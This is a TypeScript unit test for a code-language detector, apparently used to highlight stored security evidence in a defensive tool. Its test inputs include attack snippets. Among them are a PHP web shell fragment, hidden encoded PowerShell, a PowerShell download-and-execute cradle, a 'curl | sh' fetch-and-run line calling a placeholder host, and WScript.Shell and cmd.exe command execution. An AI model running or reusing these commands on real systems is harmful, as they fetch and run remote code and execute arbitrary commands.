import assert from "node:assert/strict";
import test from "node:test";
// @ts-expect-error -- TypeScript uses bundler resolution while this test uses Node directly.
import { CODE_LANGUAGES, detectCodeLanguage } from "./codeLanguage.ts";

test("stored evidence picks the matching highlighter", () => {
  assert.equal(detectCodeLanguage("{\"a\": [1, 2]}"), "json");
  assert.equal(detectCodeLanguage("<Exec> <Command>x.exe</Command> </Exec>"), "xml");
  assert.equal(detectCodeLanguage("<?php echo $_GET['c']; ?>"), "php");
  assert.equal(detectCodeLanguage("powershell -nop -w hidden -enc SQBFAFgA"), "powershell");
  assert.equal(detectCodeLanguage("$wc = New-Object Net.WebClient; IEX $wc.DownloadString('http://x')"), "powershell");
  assert.equal(detectCodeLanguage("import os\ndef run():\n    os.system('id')"), "python");
  assert.equal(detectCodeLanguage("var s = new ActiveXObject('WScript.Shell'); s.Run(cmd);"), "javascript");
  assert.equal(detectCodeLanguage("#!/bin/bash\ncurl http://x | sh"), "shell");
  assert.equal(detectCodeLanguage("SELECT name FROM sqlite_master WHERE type='table'"), "sql");
});

test("plain paths and unknown text stay plain", () => {
  assert.equal(detectCodeLanguage("C:\\Windows\\System32\\cmd.exe /c whoami"), "plain");
  assert.equal(detectCodeLanguage(""), "plain");
  assert.equal(detectCodeLanguage("{not json"), "plain");
});

test("every detected id is offered in the selector", () => {
  const ids = new Set(CODE_LANGUAGES.map((language: { id: string }) => language.id));
  for (const id of ["plain", "json", "xml", "php", "powershell", "python", "javascript", "shell", "sql"]) assert.ok(ids.has(id), id);
});
